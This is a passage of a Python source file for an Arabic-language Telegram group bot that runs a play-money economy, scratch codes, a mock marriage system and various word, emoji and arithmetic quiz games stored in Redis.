         return m.reply(f'{k} مايمدي تبيع صفر')
        if floos_to_sale > floos:
          return m.reply(f'{k} للاسف انت مطفر عندك {floos} ريال')
        if floos_to_sale == floos:
           r.delete(f'{m.from_user.id}:Floos')
        else:
           r.set(f'{m.from_user.id}:Floos',floos-floos_to_sale)
        get = int(r.get(f'{m.chat.id}:TotalMsgs:{m.from_user.id}{Dev_Zaid}'))
        rsayl = floos_to_sale * 20
        r.set(f'{m.chat.id}:TotalMsgs:{m.from_user.id}{Dev_Zaid}', get+rsayl)
        m.reply(f'{k} بعت ( {floos_to_sale} ريال 💸 ) من فلوسك\n{k} مجموع رسايلك الحين ( {get + rsayl} )\n☆')
   
   if text.startswith('اضف فلوس ') and len(text.split()) == 3 and re.findall('[0-9]+', text):
     if dev2_pls(m.from_user.id,m.chat.id):
       if m.reply_to_message and m.reply_to_message.from_user:
          floos_to_add = int(re.findall('[0-9]+', text)[0])
          if not r.get(f'{m.reply_to_message.from_user.id}:Floos'):
             r.set(f'{m.reply_to_message.from_user.id}:Floos',floos_to_add)
          else:
             floos = int(r.get(f'{m.reply_to_message.from_user.id}:Floos'))
             r.set(f'{m.reply_to_message.from_user.id}:Floos',floos_to_add+floos)
          m.reply(f'「 {m.reply_to_message.from_user.mention} 」\n{k} ضفت له ( {floos_to_add} ) ريال 💸')
   
   
   if text == 'استخراج الاكواد':
      if devp_pls(m.from_user.id,m.chat.id):
         if r.get(f'{Dev_Zaid}:codeWait'):
           t = r.ttl(f'{Dev_Zaid}:codeWait')
           wait = time.strftime('%H:%M:%S', time.gmtime(t))
           return m.reply(f'{k} استخرجت اكواد الكشط من شوي تعال بعد {wait}')
         else:
           txt = 'اكواد الكشط:\n'
           ccc = 1
           for none in range(10):
             code = ''.join([random.choice(string.ascii_letters + string.digits) for n in range(10)])
             r.set(f'{code}:CodeBank:{Dev_Zaid}',1,ex=7200)
             txt += f'{ccc} ) `{code}`\n'
             ccc += 1
           r.set(f'{Dev_Zaid}:codeWait',1,ex=7200)
           txt += '\n~ الأكواد صالحة لساعتين فقط .'
           txt += '\n༄'
           return m.reply(txt)
   
   if text.startswith('كشط ') and len(text.split()) == 2:
     code = text.split()[1]
     if not r.get(f'{code}:CodeBank:{Dev_Zaid}'):
       return m.reply(f'{k} الكود منتهي الصلاحيه او تابع لبوت ثاني')
     if r.get(f'{m.from_user.id}:BankWaitKSHT:{Dev_Zaid}'):
       t = r.ttl(f'{m.from_user.id}:BankWaitKSHT:{Dev_Zaid}')
       wait = time.strftime('%H:%M:%S', time.gmtime(t))
       return m.reply(f'{k} كشطت كود من شوي تعال بعد {wait}')
     else:
       r.delete(f'{code}:CodeBank:{Dev_Zaid}')
     if not r.get(f'{m.from_user.id}:Floos'):
       floos_from_user = 0
     else:
       floos_from_user = int(r.get(f'{m.from_user.id}:Floos'))
     chance = random.choice([1000000000, 2000000000, 3000000000])
     r.set(f'{m.from_user.id}:Floos',floos_from_user+chance)
     m.reply(f'{k} مبرووووك 🏆\n{k} كشطت الكود واخذت ( {chance} ريال 💸 )\n{k} فلوسك قبل ( `{floos_from_user}` ريال 💸 )\n{k} فلوسك الحين ( `{floos_from_user+chance}` ريال 💸 )')
     r.set(f'{m.from_user.id}:BankWaitKSHT:{Dev_Zaid}',1,ex=7200)
     if r.get(f'DevGroup:{Dev_Zaid}'):
       alert = f'𖡋 𝐍𝐀𝐌𝐄 ⌯ {m.from_user.mention}\n𖡋 𝐈𝐃 ⌯ `{m.from_user.id}`\n\nكشط الكود `{code}` وأخذ {chance} ريال 💸'
       c.send_message(int(r.get(f'DevGroup:{Dev_Zaid}')),alert)
   
   if text.startswith('زواج ') and re.findall('[0-9]+', text) and m.reply_to_message and m.reply_to_message.from_user and len(text.split()) == 2:
     if m.reply_to_message.from_user.id == c.me.id or m.reply_to_message.from_user.id == m.from_user.id:
       return m.reply('?')
     if m.reply_to_message.from_user.is_bot:
       return False
     if r.get(f'{m.from_user.id}:marriedMan:{m.chat.id}{Dev_Zaid}'):
       getUser = c.get_users(int(r.get(f'{m.from_user.id}:marriedMan:{m.chat.id}{Dev_Zaid}')))
       mention = getUser.mention
       return m.reply(f'「 {mention} 」 \n{k} تعاليييي زوجك بيخونك')
     if r.get(f'{m.from_user.id}:marriedWomen:{m.chat.id}{Dev_Zaid}'):
       getUser = c.get_users(int(r.get(f'{m.from_user.id}:marriedWomen:{m.chat.id}{Dev_Zaid}')))
       mention = getUser.mention
       return m.reply(f'「 {mention} 」 \n{k} تعال زوجتك بتخونك')
     if not r.get(f'{m.from_user.id}:Floos'):
       floos_from_user = 0
     else:
       floos_from_user = int(r.get(f'{m.from_user.id}:Floos'))
     floos = int(re.findall('[0-9]+', text)[0])
     if floos > floos_from_user:
       return m.reply('مطفر فلوسك ماتكفي')
     else:
       if r.get(f'{m.reply_to_message.from_user.id}:marriedWomen:{m.chat.id}{Dev_Zaid}'):
         return m.reply('「 {} 」 \n{} مو سنقل دورلك غيرها\n༄'.format(m.reply_to_message.from_user.mention,k))
       if r.get(f'{m.reply_to_message.from_user.id}:marriedMan:{m.chat.id}{Dev_Zaid}'):
         return m.reply('「 {} 」 \n{} مو سنقل دورلك غيره\n༄'.format(m.reply_to_message.from_user.mention,k))
       else:
         if floos < 50000:
           return m.reply('لازم المهر اقل شي 50 ألف ريال')
         else:
           if floos == floos_from_user:
             r.delete(f'{m.from_user.id}:Floos')
           else:
             r.set(f'{m.from_user.id}:Floos',floos_from_user-floos)
           r.set(f'{m.from_user.id}:marriedMan:{m.chat.id}{Dev_Zaid}',m.reply_to_message.from_user.id)
           r.set(f'{m.reply_to_message.from_user.id}:marriedWomen:{m.chat.id}{Dev_Zaid}',m.from_user.id)
           to_marry = '''
💒 وثيقة زواج

{k} 👰 العروس ↢ ( {one} )
{k} 🤵 العريس ↢ ( {two} )
'''
           to_marry += f'\n{k} 💸 المهر ↢ ( `{floos}` ريال )\n༄'
           r.set(f'{m.from_user.id}:MARRYTEXT:{m.chat.id}{Dev_Zaid}',to_marry)
           r.set(f'{m.reply_to_message.from_user.id}:MARRYTEXT:{m.chat.id}{Dev_Zaid}',to_marry)
           r.set(f'{m.from_user.id}:MARRYMONEY:{m.chat.id}{Dev_Zaid}',floos)
           r.set(f'{m.reply_to_message.from_user.id}:MARRYMONEY:{m.chat.id}{Dev_Zaid}',floos)
           r.sadd(f'{m.chat.id}:zwag:{Dev_Zaid}', f'{m.reply_to_message.from_user.id}--{m.from_user.id}&&floos={floos}')
           return m.reply(f'''
{k} باركووو للعرسان 

{k} 👰 العروس ↢ ( {m.reply_to_message.from_user.mention} )
{k} 🤵 العريس ↢ ( {m.from_user.mention} )

{k} 💸 المهر ↢ ( `{floos}` ريال )
☆
''')
           
           
   if text == 'زواجي':
     if not r.get(f'{m.from_user.id}:MARRYTEXT:{m.chat.id}{Dev_Zaid}'):
       return m.reply(f'{k} انت سنقل')
     else:
       if r.get(f'{m.from_user.id}:marriedMan:{m.chat.id}{Dev_Zaid}'):
         getUser = c.get_users(int(r.get(f'{m.from_user.id}:marriedMan:{m.chat.id}{Dev_Zaid}')))
         txt = r.get(f'{m.from_user.id}:MARRYTEXT:{m.chat.id}{Dev_Zaid}').format(k=k,two=m.from_user.mention(m.from_user.first_name[:10]),one=getUser.mention(getUser.first_name[:10]))
         return m.reply(txt)
       if r.get(f'{m.from_user.id}:marriedWomen:{m.chat.id}{Dev_Zaid}'):
         getUser = c.get_users(int(r.get(f'{m.from_user.id}:marriedWomen:{m.chat.id}{Dev_Zaid}')))
         txt = r.get(f'{m.from_user.id}:MARRYTEXT:{m.chat.id}{Dev_Zaid}').format(k=k,two=getUser.mention(getUser.first_name[:10]),one=m.from_user.mention(m.from_user.first_name[:10]))
         return m.reply(txt)         
   
   if text == "سورس" or text == "السورس":
    return m.reply_photo(
        "https://gcdnb.pbrd.co/images/bOMz1R4wG9xF.jpg",
        caption="سورس فلير حماية الكروبات، ارفعه مشرف بكروبك واحميها:",
        reply_markup=InlineKeyboardMarkup(
            [[InlineKeyboardButton("الدخول البوت 💥", url="https://t.me/w7G_BoT")]]
        )
    )
   
   if text== 'طلاق' and r.get(f'{m.from_user.id}:marriedMan:{m.chat.id}{Dev_Zaid}'):
     getUser = c.get_users(int(r.get(f'{m.from_user.id}:marriedMan:{m.chat.id}{Dev_Zaid}')))
     floos = int(r.get(f'{m.from_user.id}:MARRYMONEY:{m.chat.id}{Dev_Zaid}'))
     r.srem(f'{m.chat.id}:zwag:{Dev_Zaid}', f'{getUser.id}--{m.from_user.id}&&floos={floos}')
     if not r.get(f'{getUser.id}:Floos'):
       floos_from_whife = 0
     else:
       floos_from_whife = int(r.get(f'{getUser.id}:Floos'))
     r.set(f'{getUser.id}:Floos', floos_from_whife+floos)
     r.delete(f'{m.from_user.id}:marriedMan:{m.chat.id}{Dev_Zaid}')
     r.delete(f'{getUser.id}:marriedWomen:{m.chat.id}{Dev_Zaid}')
     r.delete(f'{getUser.id}:MARRYTEXT:{m.chat.id}{Dev_Zaid}')
     r.delete(f'{m.from_user.id}:MARRYTEXT:{m.chat.id}{Dev_Zaid}')
     r.delete(f'{m.from_user.id}:MARRYMONEY:{m.chat.id}{Dev_Zaid}')
     r.delete(f'{getUser.id}:MARRYMONEY:{m.chat.id}{Dev_Zaid}')
     return m.reply(f'{k} طلقتك من 「 {getUser.mention} 」\n{k} ضفت ( {floos} ريال 💸 ) لفلوسها')
     
   
   if text== 'خلع' and r.get(f'{m.from_user.id}:marriedWomen:{m.chat.id}{Dev_Zaid}'):
     getUser = c.get_users(int(r.get(f'{m.from_user.id}:marriedWomen:{m.chat.id}{Dev_Zaid}')))
     floos = int(r.get(f'{m.from_user.id}:MARRYMONEY:{m.chat.id}{Dev_Zaid}'))
     r.srem(f'{m.chat.id}:zwag:{Dev_Zaid}', f'{m.from_user.id}--{getUser.id}&&floos={floos}')
     if not r.get(f'{getUser.id}:Floos'):
       floos_from_has = 0
     else:
       floos_from_has = int(r.get(f'{getUser.id}:Floos'))
     r.set(f'{getUser.id}:Floos', floos_from_has+floos)
     r.delete(f'{getUser.id}:marriedMan:{m.chat.id}{Dev_Zaid}')
     r.delete(f'{m.from_user.id}:marriedWomen:{m.chat.id}{Dev_Zaid}')
     r.delete(f'{getUser.id}:MARRYTEXT:{m.chat.id}{Dev_Zaid}')
     r.delete(f'{m.from_user.id}:MARRYTEXT:{m.chat.id}{Dev_Zaid}')
     r.delete(f'{m.from_user.id}:MARRYMONEY:{m.chat.id}{Dev_Zaid}')
     r.delete(f'{getUser.id}:MARRYMONEY:{m.chat.id}{Dev_Zaid}')
     return m.reply(f'{k} خلعتك من 「 {getUser.mention} 」\n{k} ورجعت له المهر ( {floos} ريال 💸 )')

   if text == 'كت' or text == 'تويت' or text == 'كت تويت':
      return m.reply(random.choice(cut))
   
   if text == 'جمل':
     gmla = random.choice(gomal)
     r.set(f'{m.chat.id}:game:{Dev_Zaid}', gmla.replace(" '",""), ex=600)
     m.reply(f'الجملة ↢ ( {gmla} )\n{k} اكتبها بدون فواصل')
   
   if r.get(f'{m.chat.id}:gameEmoji:{Dev_Zaid}'):
     if text == r.get(f'{m.chat.id}:gameEmoji:{Dev_Zaid}'):
        ra = random.randint(1,5)
        t = r.ttl(f'{m.chat.id}:gameEmoji:{Dev_Zaid}')
        timeo = f"{20 - int(t)}.{random.randint(1,9)}"
        r.delete(f'{m.chat.id}:gameEmoji:{Dev_Zaid}')
        if r.get(f'{m.from_user.id}:Floos'):
           get = int(r.get(f'{m.from_user.id}:Floos'))
           r.set(f'{m.from_user.id}:Floos',get+ra)
           floos = int(r.get(f'{m.from_user.id}:Floos'))
        else:
           floos = ra
           r.set(f'{m.from_user.id}:Floos',ra)
        return m.reply(f'''
صح عليك ⁪⁬⁪⁬⁮⁪⁬⁪⁬⁮✔
⏰الوقت: {timeo} ثانية
💸فلوسك: {floos} ريال
☆
''')
   
   if r.get(f'{m.chat.id}:game5tm:{m.from_user.id}{Dev_Zaid}'):
    try:
     if int(text) == r.get(f'{m.chat.id}:game5tm:{m.from_user.id}{Dev_Zaid}'):
        ra = random.randint(1,5)
        t = r.ttl(f'{m.chat.id}:game5tm:{m.from_user.id}{Dev_Zaid}')
        timeo = f"{600 - int(t)}.{random.randint(1,9)}"
        r.delete(f'{m.chat.id}:game5tm:{m.from_user.id}{Dev_Zaid}')
        if r.get(f'{m.from_user.id}:Floos'):
           get = int(r.get(f'{m.from_user.id}:Floos'))
           r.set(f'{m.from_user.id}:Floos',get+ra)
           floos = int(r.get(f'{m.from_user.id}:Floos'))
        else:
           floos = ra
           r.set(f'{m.from_user.id}:Floos',ra)
        return m.reply(f'''
صح عليك ⁪⁬⁪⁬⁮⁪⁬⁪⁬⁮✔
⏰الوقت: {timeo} ثانية
💸فلوسك: {floos} ريال
☆
''')
     else:
        r.delete(f'{m.chat.id}:game5tm:{m.from_user.id}{Dev_Zaid}')
        return m.reply(f'{k} اجابتك خطأ')
    except:
     pass

   if r.get(f'{m.chat.id}:game:{Dev_Zaid}'):
     if text == r.get(f'{m.chat.id}:game:{Dev_Zaid}'):
        ra = random.randint(1,5)
        t = r.ttl(f'{m.chat.id}:game:{Dev_Zaid}')
        timeo = f"{600 - int(t)}.{random.randint(1,9)}"
        r.delete(f'{m.chat.id}:game:{Dev_Zaid}')
        if r.get(f'{m.from_user.id}:Floos'):
           get = int(r.get(f'{m.from_user.id}:Floos'))
           r.set(f'{m.from_user.id}:Floos',get+ra)
           floos = int(r.get(f'{m.from_user.id}:Floos'))
        else:
           floos = ra
           r.set(f'{m.from_user.id}:Floos',ra)
        m.reply(f'''
صح عليك ⁪⁬⁪⁬⁮⁪⁬⁪⁬⁮✔
⏰الوقت: {timeo} ثانية
💸فلوسك: {floos} ريال
☆
''')
        return True
     
   
   if text == 'ترتيب':
     name = random.choice(trteep)
     name1 = name
     name = re.sub('سحور', 'س ر و ح', name)
     name = re.sub('سياره', 'ه ر س ي ا', name)
     name = re.sub('استقبال', 'ل ب ا ت ق س ا', name)
     name = re.sub('قنافه', 'ه ق ا ن ف', name)
     name = re.sub('ايفون', 'و ن ف ا', name)
     name = re.sub('بطاطس', 'ب ط ا ط س', name)
     name = re.sub('مطبخ', 'خ ب ط م', name)
     name = re.sub('كرستيانو', 'س ت ا ن و ك ر ي', name)
     name = re.sub('دجاجه', 'ج ج ا د ه', name)
     name = re.sub('مدرسه', 'ه م د ر س', name)
     name = re.sub('الوان', 'ن ا و ا ل', name)
     name = re.sub('غرفه', 'غ ه ر ف', name)
     name = re.sub('ثلاجه', 'ج ه ت ل ا', name)
     name = re.sub('قهوه', 'ه ق ه و', name)
     name = re.sub('سفينه', 'ه ن ف ي س', name)
     name = re.sub('مصر', 'ر م ص', name)
     name = re.sub('محطه', 'ه ط م ح', name)
     name = re.sub('طياره', 'ر ا ط ي ه', name)
     name = re.sub('رادار', 'ر ا ر ا د', name)
     name = re.sub('منزل', 'ن ز م ل', name)
     name = re.sub('مستشفى', 'ى ش س ف ت م', name)
     name = re.sub('كهرباء', 'ر ب ك ه ا ء', name)
     name = re.sub('تفاحه', 'ح ه ا ت ف', name)
     name = re.sub('اخطبوط', 'ط ب و ا خ ط', name)
     name = re.sub('سنترال', 'ن ر ت ل ا س', name)
     name = re.sub('فرنسا', 'ن ف ر س ا', name)
     name = re.sub('برتقاله', 'ر ت ق ب ا ه ل', name)
     name = re.sub('تفاح', 'ح ف ا ت', name)
     name = re.sub('مطرقه', 'ه ط م ر ق', name)
     name = re.sub('هريسه', 'س ه ر ي ه', name)
     name = re.sub('لبانه', 'ب ن ل ه ا', name)
     name = re.sub('شباك', 'ب ش ا ك', name)
     name = re.sub('باص', 'ص ا ب', name)
     name = re.sub('سمكه', 'ك س م ه', name)
     name = re.sub('ذباب', 'ب ا ب ذ', name)
     name = re.sub('تلفاز', 'ت ف ل ز ا', name)
     name = re.sub('حاسوب', 'س ا ح و ب', name)
     name = re.sub('انترنت', 'ا ت ن ر ن ت', name)
     name = re.sub('ساحه', 'ح ا ه س', name)
     name = re.sub('جسر', 'ر ج س', name)
     r.set(f'{m.chat.id}:game:{Dev_Zaid}', name1,ex=600)
     m.reply(f'رتب ↢ {name}')
     return True
   
   if text == 'ايموجي':
      if r.get(f'{m.chat.id}:gameEmoji:{Dev_Zaid}'):
        return m.reply(f'{k} معليش في لعبة ايموجي شغالة الحين حاول بعد 20 ثانية\n\n{k} في حال ماتبي تكملها ارسل سكب')
      ran = random.choice(emojis_pics)
      emoji = ran['emoji']
      photo = ran['photo']
      a = m.reply_photo(photo,caption='اسرع واحد يرسل الايموجي')
      r.delete(f'{m.chat.id}:game:{Dev_Zaid}')
      time.sleep(3)
      r.set(f'{m.chat.id}:gameEmoji:{Dev_Zaid}', emoji,ex=20)
      a.edit_media(media=InputMediaPhoto (media='https://telegra.ph/file/b53b14951a50d7f75c39e.jpg', caption='ارسل الايموجي الحين'))
      return True
   
   if text == 'سكب':
      if r.get(f'{m.chat.id}:gameEmoji:{Dev_Zaid}'):
         r.delete(f'{m.chat.id}:gameEmoji:{Dev_Zaid}')
         m.reply(f'{k} سكبت لعبه الايموجي')
         return True
   
   if text == 'انقليزي':
     name = random.choice(english)
     name1 = name
     name = re.sub("ذئب", "wolf", name)
     name = re.sub("معلومات", "information", name)
     name = re.sub("قنوات", "channels", name)
     name = re.sub("مجموعات", "groups", name)
     name = re.sub("كتاب", "book", name)
     name = re.sub("تفاحه", "apple", name)
     name = re.sub("مصر", "egypt", name)
     name = re.sub("فلوس", "money", name)
     name = re.sub("اعلم", "i know", name)
     name = re.sub("تمساح", "crocodile", name)
     name = re.sub("مختلف", "different", name)
     name = re.sub("ذكي", "intelligent", name)
     name = re.sub("كلب", "dog", name)
     name = re.sub("صقر", "falcon", name)
     name = re.sub("مشكله", "error", name)
     name = re.sub("كمبيوتر", "computer", name)
     name = re.sub("اصدقاء", "friends", name)
     name = re.sub("منضده", "table", name)
     r.set(f'{m.chat.id}:game:{Dev_Zaid}', name1,ex=600)
     m.reply(f'اكتب معنى ↢ ( {name} )')
     return True
   
   if text == 'معاني':
     name = random.choice(m3any)
     name1 = name
     name = re.sub("قرد", "🐒", name)
     name = re.sub("دجاجه", "🐔", name)
     name = re.sub("بطريق", "🐧", name)
     name = re.sub("ضفدع", "🐸", name)
     name = re.sub("بومه", "🦉", name)
     name = re.sub("نحله", "🐝", name)
     name = re.sub("ديك", "🐓", name)
     name = re.sub("جمل", "🐫", name)
     name = re.sub("بقره", "🐄", name)
     name = re.sub("دولفين", "🐳", name)
     name = re.sub("تمساح", "🐊", name)
     name = re.sub("قرش", "🦈", name)
     name = re.sub("نمر", "🐅", name)
     name = re.sub("اخطبوط", "🐙", name)
     name = re.sub("سمكه", "🐟", name)
     name = re.sub("خفاش", "🦇", name)
     name = re.sub("اسد", "🦁", name)
     name = re.sub("فأر", "🐭", name)
     name = re.sub("ذئب", "🐺", name)
     name = re.sub("فراشه", "🦋", name)
     name = re.sub("عقرب", "🦂", name)
     name = re.sub("زرافه", "🦒", name)
     name = re.sub("قنفذ", "🦔", name)
     name = re.sub("تفاحه", "🍎", name)
     name = re.sub("باذنجان", "🍆", name)
     name = re.sub("قوس قزح", "🌈", name)
     name = re.sub("بزازه", "🍼", name)
     name = re.sub("بطيخ", "🍉", name)
     name = re.sub("وزه", "🦆", name)
     name = re.sub("كتكوت", "🐣", name)
     r.set(f'{m.chat.id}:game:{Dev_Zaid}', name1,ex=600)
     m.reply(f'ايش معنى الايموجي ↢ ( {name} )')
     return True
   
   if text == 'احسب':
     name = random.choice(Maths)
     name1 = name
     name = re.sub("200", "250 - 50 = ?", name)
     name = re.sub("605", "655 - 50 = ?", name)
     name = re.sub("210", "247 - 37 = ?", name)
     name = re.sub("128", "168 - 40 = ?", name)
     name = re.sub("126", "202 - 76 = ?", name)
     name = re.sub("263", "31297 ÷ 119 = ?", name)
     name = re.sub("150", "246 - 96 = ?", name)
     name = re.sub("2000", "200 × 10 = ?", name)
     name = re.sub("40", "95 - 55 = ?", name)
     name = re.sub("242", "276 - 34 = ?", name)
     name = re.sub("14", "29 - 15 = ?", name)
     name = re.sub("13", "16 - 3 = ?", name)
     name = re.sub("1000", "956 + 44 = ?", name)
     name = re.sub("810", "767 + 43 = ?", name)
     name = re.sub("110", "77 + 33 = ?", name)
     name = re.sub("830", "745 + 85 = ?", name)
     name = re.sub("111", "66 + 45 = ?", name)
     name = re.sub("92", "61 + 31 = ?", name)
     name = re.sub("1110", "988 + 122 = ?", name)
     name = re.sub("6800", "85 × 80 = ?", name)
     name = re.sub("1554", "777 × 2 = ?", name)
     name = re.sub("920", "92 × 10 = ?", name)
     name = re.sub("1740", "87 × 20 = ?", name)
     name = re.sub("1140", "76 × 15 = ?", name)
     name = re.sub("1056", "88 × 12 = ?", name)
     name = re.sub("331", "243 + 88 = ?", name)
     name = re.sub("162", "250 - 88 = ?", name)
     name = re.sub("245", "290 - 45 = ?", name)
     name = re.sub("900", "975 - 75 = ?", name)
     name = re.sub("791", "878 - 87= ?", name)
     name = re.sub("0", "99 - 99 = ?", name)
     name = re.sub("57", "77 - 20 = ?", name)
     name = re.sub("220", "250 - 30 = ?", name)
     r.set(f'{m.chat.id}:game:{Dev_Zaid}', name1,ex=600)
     m.reply(f'{name}')
     return True
   
   if text == 'عربي':
     name = random.choice(Arab)
     name1 = name
     name = re.sub("اناث", "انثى", name)
     name = re.sub("ثيران", "ثور", name)
     name = re.sub("دروس", "درس", name)
     name = re.sub("فحص", "فحوص", name)
     name = re.sub("رجال", "رجل", name)
     name = re.sub("كتب", "كتاب", name)
     name = re.sub("ضغوط", "ضغط", name)
     name = re.sub("صف", "صفوف", name)
     name = re.sub("عصفور", "عصافير", name)
     name = re.sub("لصوص", "لص", name)
     name = re.sub("تماسيح", "تمساح", name)
     name = re.sub("ملك", "ملوك", name)
     name = re.sub("فصل", "فصول", name)
     name = re.sub("كلاب", "كلب", name)
     name = re.sub("صقور", "صقر", name)
     name = re.sub("عقد", "عقود", name)
     name = re.sub("بحور", "بحر", name)
     name = re.sub("هاتف", "هواتف", name)
     name = re.sub("حدائق", "حديقه", name)
     name = re.sub("مسرح", "مسارح", name)
     name = re.sub("جرائم", "جريمة", name)
     name = re.sub("مدارس", "مدرسة", name)
     name = re.sub("منزل", "منازل", name)
     name = re.sub("كرسي", "كراسي", name)
     name = re.sub("مناطق", "منطقة", name)
     name = re.sub("بيوت", "بيت", name)
     name = re.sub("بنك", "بنوك", name)
     name = re.sub("علم", "علوم", name)
     name = re.sub("وظائف", "وظيفة", name)
     name = re.sub("طلاب", "طالب", name)
     name = re.sub("مراحل", "مرحلة", name)
     name = re.sub("فنانين", "فنان", name)
     name = re.sub("صواريخ", "صاروخ", name)
     r.set(f'{m.chat.id}:game:{Dev_Zaid}', name1,ex=600)
     m.reply(f'اكتب جمع او مفرد ↢ ( {name} )')
     return True
   
   if text == 'كلمات':
     name = random.choice(words)
     '''
     name1 = name
     name = re.sub("ذئب", "ذئب", name)
     name = re.sub("معلومات", "معلومات", name)
     name = re.sub("قنوات", "قنوات", name)
     name = re.sub("مجموعات", "مجموعات", name)
     name = re.sub("كتاب", "كتاب", name)
     name = re.sub("تفاحه", "تفاحه", name)
     name = re.sub("مصر", "مصر", name)
     name = re.sub("فلوس", "فلوس", name)
     name = re.sub("اعلم", "اعلم", name)
     name = re.sub("تمساح", "تمساح", name)
     name = re.sub("مختلف", "مختلف", name)
     name = re.sub("ذكي", "ذكي", name)
     name = re.sub("كلب", "كلب", name)
     name = re.sub("صقر", "صقر", name)
     name = re.sub("مشكله", "مشكله", name)
     name = re.sub("كمبيوتر", "كمبيوتر", name)
     name = re.sub("اصدقاء", "اصدقاء", name)
     name = re.sub("منضده", "منضده", name)
     name = re.sub("سائق", "سائق", name)
     name = re.sub("جبل", "جبل", name)
     name = re.sub("مفتاح", "مفتاح", name)
     name = re.sub("يساوي", "يساوي", name)
     name = re.sub("انتبه", "انتبه", name)
     name = re.sub("موقد", "موقد", name)
     name = re.sub("مكتئب", "مكتئب", name)
     name = re.sub("انسان", "انسان", name)
     name = re.sub("ضفدع", "ضفدع", name)
     name = re.sub("عشق", "عشق", name)
     name = re.sub("منزل", "منزل", name)
     name = re.sub("طلاب", "طلاب", name)
     name = re.sub("فنان", "فنان", name)
     name = re.sub("صاروخ", "صاروخ", name)
     '''
     r.set(f'{m.chat.id}:game:{Dev_Zaid}', name,ex=600)
     m.reply(f'الكلمة ↢ ( {name} )')
     return True

   if text == 'تفكيك':
     tfkeek = random.choice(trteep)
     name = ' '.join(a for a in tfkeek)
     r.set(f'{m.chat.id}:game:{Dev_Zaid}', name,ex=600)
     m.reply(f'فكك ↢ ( {tfkeek} )')
     return True
   
   
   if text == 'عواصم':
     country=random.choice(countries)
     name = country['name']
     capital=country['capital']
     r.set(f'{m.chat.id}:game:{Dev_Zaid}', capital,ex=600)
     m.reply(f'{k} ايش عاصمة {name} ؟')
     return True
   
   if text == 'اكمل':
     name = random.choice(mthal)
     name1 = name
     name = re.sub("اخوات", "لو قلبك مات متجيش على اتنين ... ", name)
     name = re.sub("زيهم", "اى ياعمهم اشتكيلك منهم تعمل ... ", name)
     name = re.sub("شمعتك", "دارى على ... تقيد", name)
     name = re.sub("داره", "من خرج من ... قل مقداره", name)
     name = re.sub("الوالدين", "رضا ... احسن من ابوك وامك", name)
     name = re.sub("الرءوس", "اذا تطاول الايدي تساوت ... ", name)
     name = re.sub("مرايه", "فى الوش ... وفى القفه سلايه", name)
     name = re.sub("حدو", "الشئ اللى يزيد عن ...  ينقلب لضدو", name)
     name = re.sub("رجالها", "مايجبها الا  ... ", name)
     name = re.sub("عدوك", "امشى عدل يحتار ... فيك", name)
     name = re.sub("الزبيب", "ضرب الحبيب زى اكل  ... ", name)
     name = re.sub("الغراب", "ياما جاب ...  لامه", name)
     name = re.sub("ماتو", "اللى اغتشو ... ", name)
     name = re.sub("اتمكن", "اتمسكن لحد ما ... ", name)
     name = re.sub("زجاج", "اللى بيتو من ... مايحدفش الناس بالطوب", name)
     name = re.sub("فار", "لو غاب القط العب يا ... ", name)
     name = re.sub("شهر", "امشي ... ولا تعدى نهر", name)
     name = re.sub("القتيل", "يقتل ... ويمشى فى جنازته", name)
     name = re.sub("الغطاس", "المايه تكدب ... ", name)
     name = re.sub("يكحلها", "جه ... عماها", name)
     name = re.sub("امه", "القرد فى عين ... غزال", name)
     r.set(f'{m.chat.id}:game:{Dev_Zaid}', name1 ,ex=600)
     m.reply(f'اكمل ↢ ( {name} ؟ )')
     return True
   
   if text == 'احكام':
     if r.get(f'{m.chat.id}:AHKAMGAME:{Dev_Zaid}'):
       return m.reply(f"{k} معليش في لعبة احكام شغالة الحين حاول بعد دقيقة")
     m.reply(f'''
{k} بدينا لعبة احكام واضفت اسمك 
{k} اللي يبي يلعب يرسل كلمة ( انا ) 

{k} اللي عليك انت صاحب اللعبة ترسل ( تم ) اذا اكتمل العدد
☆
''')
     r.delete(f'{m.chat.id}:ListAhkam:{Dev_Zaid}')
     r.set(f'{m.chat.id}:AHKAMGAME:{Dev_Zaid}',m.from_user.id,ex=120)
     r.sadd(f'{m.chat.id}:ListAhkam:{Dev_Zaid}',m.from_user.id)
     return True
     
   if text == 'انا' and r.get(f'{m.chat.id}:AHKAMGAME:{Dev_Zaid}'):
     if r.sismember(f'{m.chat.id}:ListAhkam:{Dev_Zaid}',m.from_user.id):
       return m.reply(f"{k} اسمك موجود بالقائمة")
     else:
       m.reply(f"{k} ضفت اسمك للقائمة")
       r.sadd(f'{m.chat.id}:ListAhkam:{Dev_Zaid}',m.from_user.id)
       return True
  
   if text == 'تم' and r.get(f'{m.chat.id}:AHKAMGAME:{Dev_Zaid}') and m.from_user.id == int(r.get(f'{m.chat.id}:AHKAMGAME:{Dev_Zaid}')):
     if len(r.smembers(f'{m.chat.id}:ListAhkam:{Dev_Zaid}')) == 1:
       return m.reply(f"{k} مافيه لاعبين")
     else:
       ids = [elem for elem in r.smembers(f'{m.chat.id}:ListAhkam:{Dev_Zaid}')]
       id = random.choice(ids)
       getUser = c.get_users(int(id))
       m.reply(f"{k} تم اختيار ( ⁪⁬⁪⁬{getUser.mention} ) للحكم عليه")
       r.delete(f'{m.chat.id}:ListAhkam:{Dev_Zaid}')
       r.delete(f'{m.chat.id}:AHKAMGAME:{Dev_Zaid}')
       return True
   
   
   if text == 'روليت':
     if r.get(f'{m.chat.id}:ROLETGAME:{Dev_Zaid}'):
       return m.reply(f"{k} معليش في لعبة روليت شغالة الحين حاول بعد دقيقة")
     m.reply(f'''
{k} بدينا لعبة الروليت واضفت اسمك 
{k} اللي يبي يلعب يرسل كلمة ( انا ) 

{k} اللي عليك انت صاحب اللعبة ترسل ( تم ) اذا اكتمل العدد
☆
''')
     r.delete(f'{m.chat.id}:ListRolet:{Dev_Zaid}')
     r.set(f'{m.chat.id}:ROLETGAME:{Dev_Zaid}',m.from_user.id,ex=120)
     r.sadd(f'{m.chat.id}:ListRolet:{Dev_Zaid}',m.from_user.id)
     return True
     
   if text == 'انا' and r.get(f'{m.chat.id}:ROLETGAME:{Dev_Zaid}'):
     if r.sismember(f'{m.chat.id}:ListRolet:{Dev_Zaid}',m.from_user.id):
       return m.reply(f"{k} اسمك موجود بالقائمة")
     else:
       m.reply(f"{k} ضفت اسمك للقائمة")
       r.sadd(f'{m.chat.id}:ListRolet:{Dev_Zaid}',m.from_user.id)
       return True
  
   if text == 'تم' and r.get(f'{m.chat.id}:ROLETGAME:{Dev_Zaid}') and m.from_user.id == int(r.get(f'{m.chat.id}:ROLETGAME:{Dev_Zaid}')):
     if len(r.smembers(f'{m.chat.id}:ListRolet:{Dev_Zaid}')) == 1:
